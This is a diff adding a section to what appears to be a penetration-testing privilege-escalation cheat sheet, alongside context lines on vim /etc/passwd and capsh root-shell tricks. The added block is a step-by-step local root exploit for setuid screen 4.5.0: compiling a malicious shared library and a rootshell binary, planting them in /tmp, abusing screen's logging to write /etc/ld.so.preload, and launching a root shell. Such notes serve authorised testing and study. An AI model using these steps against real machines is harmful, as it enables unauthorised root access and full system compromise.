@@ -365,6 +365,28 @@ vim.basic /etc/passwd
 /sbin/capsh --gid=0 --uid=0 --
 ```
 
+```
+screen-4.5.0 with suid:
+https://github.com/X0RW3LL/XenSpawn/blob/main/spawn.sh
+
+sudo ./spawn.sh Xenial
+sudo systemd-nspawn -M Xenial
+#Spawning container MACHINE_NAME on /var/lib/machines/Xenial 
+#Press ^] three times within 1s to kill container.
+
+root@Xenial:gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+root@Xenial:~# gcc -o rootshell -L libhax.so rootshell.c
+
+#transfer libhax.so and rootshell to target machine's /tmp/
+cd /etc
+umask 000 # because
+screen(with suid) -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+screen(with suid) -ls # screen itself is setuid, so...
+/tmp/rootshell
+
+#To completely remove the container from your system, you can use machinectl as follows
+kali@kali:sudo machinectl remove MACHINE_NAME
+```
  ###### Cronjob to elevate privilege
  leverage the cron jobs run by root but current user can edit it to elevate privilege
  ```
